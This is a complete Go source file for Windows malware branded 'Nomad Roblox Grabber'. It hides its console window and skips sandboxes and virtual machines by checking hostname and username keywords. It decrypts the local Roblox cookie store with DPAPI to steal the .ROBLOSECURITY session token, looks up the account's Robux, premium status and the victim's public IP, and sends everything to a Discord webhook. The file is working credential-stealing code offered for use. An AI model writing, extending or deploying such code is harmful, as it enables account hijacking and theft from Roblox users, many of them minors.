package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// config
var g_verbose = false
var g_anti_vm = true
var g_webhookURL = "https://discord.com/api/webhooks/INSERT_WEBHOOK_URL_HERE"

func hideConsole() {
	console := windows.NewLazySystemDLL("kernel32.dll").NewProc("GetConsoleWindow")
	hwnd, _, _ := console.Call()
	if hwnd != 0 {
		user32 := windows.NewLazySystemDLL("user32.dll")
		showWindow := user32.NewProc("ShowWindow")
		showWindow.Call(hwnd, 0)
	}
}

var (
	crypt32                = windows.NewLazySystemDLL("crypt32.dll")
	procCryptUnprotectData = crypt32.NewProc("CryptUnprotectData")
)

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

type DiscordWebhook struct {
	Embeds []DiscordEmbed `json:"embeds"`
}

type DiscordEmbed struct {
	Title       string                 `json:"title"`
	Description string                 `json:"description"`
	Color       int                    `json:"color"`
	Fields      []DiscordEmbedField    `json:"fields"`
	Thumbnail   *DiscordEmbedThumbnail `json:"thumbnail,omitempty"`
	Footer      *DiscordEmbedFooter    `json:"footer,omitempty"`
	Timestamp   string                 `json:"timestamp,omitempty"`
}

type DiscordEmbedField struct {
	Name   string `json:"name"`
	Value  string `json:"value"`
	Inline bool   `json:"inline,omitempty"`
}

type DiscordEmbedThumbnail struct {
	URL string `json:"url"`
}

type DiscordEmbedFooter struct {
	Text    string `json:"text"`
	IconURL string `json:"icon_url,omitempty"`
}

var httpClient = &http.Client{
	Timeout: 10 * time.Second,
	Transport: &http.Transport{
		MaxIdleConns:        10,
		MaxIdleConnsPerHost: 10,
		IdleConnTimeout:     30 * time.Second,
	},
}

func getPublicIP() string {
	services := []string{
		"https://api.ipify.org",
		"https://icanhazip.com",
		"https://checkip.amazonaws.com",
	}

	for _, service := range services {
		resp, err := httpClient.Get(service)
		if err != nil {
			continue
		}
		body, err := ioutil.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			continue
		}
		ip := strings.TrimSpace(string(body))
		if net.ParseIP(ip) != nil {
			return ip
		}
	}

	addrs, err := net.InterfaceAddrs()
	if err == nil {
		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() && ipnet.IP.To4() != nil {
				return ipnet.IP.String() + " (local)"
			}
		}
	}

	return "unable to detect"
}

func dpapiUnprotect(encryptedData []byte, optionalEntropy []byte) ([]byte, error) {
	var dataIn, dataOut DATA_BLOB
	dataIn.cbData = uint32(len(encryptedData))
	dataIn.pbData = &encryptedData[0]
	var pOptionalEntropy *byte
	if len(optionalEntropy) > 0 {
		optionalBlob := DATA_BLOB{cbData: uint32(len(optionalEntropy)), pbData: &optionalEntropy[0]}
		pOptionalEntropy = optionalBlob.pbData
	}
	ret, _, _ := procCryptUnprotectData.Call(
		uintptr(unsafe.Pointer(&dataIn)), 0,
		uintptr(unsafe.Pointer(pOptionalEntropy)), 0, 0, 1,
		uintptr(unsafe.Pointer(&dataOut)))
	if ret == 0 {
		return nil, fmt.Errorf("dpapi unprotect failed")
	}
	defer windows.LocalFree(windows.Handle(uintptr(unsafe.Pointer(dataOut.pbData))))
	result := make([]byte, dataOut.cbData)
	copy(result, (*[1 << 30]byte)(unsafe.Pointer(dataOut.pbData))[:dataOut.cbData])
	return result, nil
}

func extractRobloxCookie(cookiesContent string) string {
	re := regexp.MustCompile(`\.ROBLOSECURITY\s+([^\s]+)`)
	matches := re.FindStringSubmatch(cookiesContent)
	if len(matches) > 1 {
		return matches[1]
	}
	return ""
}

func getRobloxUserInfo(robloxCookie string) (userId, username string, err error) {
	url := "https://users.roblox.com/v1/users/authenticated"
	req, _ := http.NewRequest("GET", url, nil)
	req.Header.Set("Cookie", ".ROBLOSECURITY="+robloxCookie)

	resp, err := httpClient.Do(req)
	if err != nil {
		return "", "", err
	}
	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)
	var userData map[string]interface{}
	if json.Unmarshal(body, &userData) == nil {
		if id, ok := userData["id"].(float64); ok {
			userId = fmt.Sprintf("%.0f", id)
		}
		if name, ok := userData["name"].(string); ok {
			username = name
		}
	}
	return userId, username, nil
}

func getRobux(robloxCookie, userId string) (float64, error) {
	url := "https://economy.roblox.com/v1/users/" + userId + "/currency"
	req, _ := http.NewRequest("GET", url, nil)
	req.Header.Set("Cookie", ".ROBLOSECURITY="+robloxCookie)

	resp, err := httpClient.Do(req)
	if err != nil {
		return 0, err
	}
	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)
	var robuxData map[string]interface{}
	if json.Unmarshal(body, &robuxData) == nil {
		if robux, ok := robuxData["robux"].(float64); ok {
			return robux, nil
		}
	}
	return 0, nil
}

func getPremiumStatus(robloxCookie string) (bool, error) {
	url := "https://premiumfeatures.roblox.com/v1/user/premium"
	req, _ := http.NewRequest("GET", url, nil)
	req.Header.Set("Cookie", ".ROBLOSECURITY="+robloxCookie)

	resp, err := httpClient.Do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)
	var premiumData map[string]interface{}
	if json.Unmarshal(body, &premiumData) == nil {
		if isPremium, ok := premiumData["isPremium"].(bool); ok {
			return isPremium, nil
		}
	}
	return false, nil
}

func getAvatarURL(userId string) string {
	url := fmt.Sprintf("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%s&size=420x420&format=Png", userId)

	resp, err := httpClient.Get(url)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)
	var avatarData map[string]interface{}
	if json.Unmarshal(body, &avatarData) == nil {
		if data, ok := avatarData["data"].([]interface{}); ok && len(data) > 0 {
			if item, ok := data[0].(map[string]interface{}); ok {
				if url, ok := item["imageUrl"].(string); ok {
					return url
				}
			}
		}
	}
	return ""
}

func getHostname() string {
	name, err := os.Hostname()
	if err != nil {
		return "unknown"
	}
	return name
}

func getUsername() string {
	return os.Getenv("USERNAME")
}

func validateRuntimeEnvironment() bool {
	if !g_anti_vm {
		return false
	}

	hostname := strings.ToLower(getHostname())
	suspiciousNames := []string{
		"sandbox", "virus", "malware", "analysis", "cuckoo", "forensic",
		"vmware", "virtualbox", "qemu", "vbox", "xen", "parallels",
	}
	for _, name := range suspiciousNames {
		if strings.Contains(hostname, name) {
			return true
		}
	}

	username := strings.ToLower(getUsername())
	suspiciousUsers := []string{
		"sandbox", "virus", "malware", "analysis", "cuckoo", "forensic",
		"vmware", "virtualbox", "qemu", "currentuser", "test", "user",
	}
	for _, name := range suspiciousUsers {
		if strings.Contains(username, name) {
			return true
		}
	}

	return false
}

func sendToDiscord(webhookURL string, username, userId string, robux float64, isPremium bool, robloxCookie string, avatarURL string, publicIP string) {
	premiumText := "no"
	if isPremium {
		premiumText = "yes"
	}

	thumbnail := &DiscordEmbedThumbnail{URL: avatarURL}

	embed := DiscordEmbed{
		Title:       "Roblox Account Data - Nomad Grabber",
		Description: fmt.Sprintf("### %s\n`@%s`", username, userId),
		Color:       0x5865F2,
		Thumbnail:   thumbnail,
		Timestamp:   time.Now().UTC().Format(time.RFC3339),
		Footer: &DiscordEmbedFooter{
			Text:    "Nomad Roblox Grabber",
			IconURL: "https://www.roblox.com/favicon.ico",
		},
		Fields: []DiscordEmbedField{
			{Name: "User ID", Value: fmt.Sprintf("`%s`", userId), Inline: true},
			{Name: "Robux", Value: fmt.Sprintf("**%.0f**", robux), Inline: true},
			{Name: "Premium", Value: premiumText, Inline: true},
			{Name: "Public IP", Value: fmt.Sprintf("`%s`", publicIP), Inline: false},
			{Name: "Cookie", Value: fmt.Sprintf("```\n%s\n```", robloxCookie), Inline: false},
		},
	}

	webhook := DiscordWebhook{Embeds: []DiscordEmbed{embed}}
	jsonData, _ := json.Marshal(webhook)
	httpClient.Post(webhookURL, "application/json", bytes.NewBuffer(jsonData))
}

func collectAndSendRobloxData() {
	localAppData := os.Getenv("LOCALAPPDATA")
	cookiesPath := filepath.Join(localAppData, "Roblox", "LocalStorage", "RobloxCookies.dat")

	data, err := ioutil.ReadFile(cookiesPath)
	if err != nil {
		return
	}

	pattern := regexp.MustCompile(`"CookiesData"\s*:\s*"([^"]+)"`)
	matches := pattern.FindStringSubmatch(string(data))
	if len(matches) < 2 {
		return
	}

	encryptedBytes, err := base64.StdEncoding.DecodeString(matches[1])
	if err != nil {
		return
	}

	decryptedBytes, err := dpapiUnprotect(encryptedBytes, nil)
	if err != nil {
		return
	}

	cookiesContent := string(decryptedBytes)
	robloxCookie := extractRobloxCookie(cookiesContent)
	if robloxCookie == "" {
		return
	}

	robloxCookie = strings.TrimSpace(robloxCookie)

	userId, username, err := getRobloxUserInfo(robloxCookie)
	if err != nil || userId == "" {
		return
	}

	var wg sync.WaitGroup
	wg.Add(4)

	var publicIP string
	go func() {
		defer wg.Done()
		publicIP = getPublicIP()
	}()

	var robux float64
	go func() {
		defer wg.Done()
		robux, _ = getRobux(robloxCookie, userId)
	}()

	var isPremium bool
	go func() {
		defer wg.Done()
		isPremium, _ = getPremiumStatus(robloxCookie)
	}()

	var avatarURL string
	go func() {
		defer wg.Done()
		avatarURL = getAvatarURL(userId)
		if avatarURL == "" {
			avatarURL = "https://www.roblox.com/favicon.ico"
		}
	}()

	wg.Wait()
	sendToDiscord(g_webhookURL, username, userId, robux, isPremium, robloxCookie, avatarURL, publicIP)
}

func main() {
	hideConsole()

	if validateRuntimeEnvironment() {
		os.Exit(0)
	}

	if g_webhookURL == "" {
		return
	}

	collectAndSendRobloxData()
}
